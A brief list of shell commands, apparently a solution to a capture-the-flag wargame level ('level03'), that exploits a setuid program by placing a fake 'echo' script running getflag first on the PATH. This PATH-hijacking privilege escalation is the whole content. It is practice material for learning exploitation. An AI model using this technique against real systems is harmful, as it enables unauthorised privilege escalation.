# Level03 steps
ltrace ./level03
mkdir -p /tmp/level03 && cd /tmp/level03
printf '#!/bin/sh\ngetflag\n' > echo
chmod +x echo
export PATH=/tmp/level03:$PATH
/home/user/level03/level03
